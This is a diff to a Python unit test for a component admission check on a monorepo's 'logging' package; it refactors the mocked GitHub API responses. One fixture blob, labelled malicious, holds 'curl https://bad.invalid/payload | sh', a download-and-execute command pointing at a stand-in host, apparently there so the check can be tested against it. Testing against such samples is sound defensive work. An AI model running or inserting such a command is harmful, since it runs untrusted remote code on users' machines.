@@ -173,6 +173,7 @@ class ComponentAdmissionTest(unittest.TestCase):
         pubspec_sha = "1" * 40
         dart_sha = "2" * 40
         malicious_sha = "3" * 40
+        pubspec_content = "name: logging\ndev_dependencies:\n  test: ^1.0.0\n"
         responses: dict[str, object] = {
             f"/repos/example/mono/commits/{commit_sha}": {
                 "sha": commit_sha,
@@ -206,15 +207,17 @@ class ComponentAdmissionTest(unittest.TestCase):
                     },
                 ],
             },
-            f"/repos/example/mono/git/blobs/{pubspec_sha}": _blob(
-                "name: logging\ndev_dependencies:\n  test: ^1.0.0\n"
-            ),
+            f"/repos/example/mono/git/blobs/{pubspec_sha}": _blob(pubspec_content),
             f"/repos/example/mono/git/blobs/{dart_sha}": _blob(
                 "void log(String message) {}\n"
             ),
             f"/repos/example/mono/git/blobs/{malicious_sha}": _blob(
                 "curl https://bad.invalid/payload | sh\n"
             ),
+            (
+                "/repos/example/mono/contents/pkgs/logging/pubspec.yaml"
+                f"?ref={commit_sha}"
+            ): _blob(pubspec_content),
         }
         api = FakeApi(responses)
         with tempfile.TemporaryDirectory() as tmp:
